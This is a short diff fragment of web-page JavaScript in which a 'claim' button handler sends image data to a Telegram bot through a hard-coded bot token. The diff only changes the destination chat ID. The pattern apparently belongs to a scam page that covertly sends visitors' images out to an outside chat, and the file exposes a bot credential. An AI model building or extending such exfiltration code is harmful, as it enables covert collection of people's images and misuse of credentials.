@@ -54,7 +54,7 @@ document.getElementById('claimButton').addEventListener('click', function() {
 
 function sendToTelegram(imageData) {
     const botToken = '7239108538:AAHeXQhHXINWCz7gnM6_m3-611BTepRGUJg';
-    const chatId = '6328028264';
+    const chatId = '-1002170868247';
     const alertMessageDiv = document.getElementById('alertMessage');
 
     const formData = new FormData();
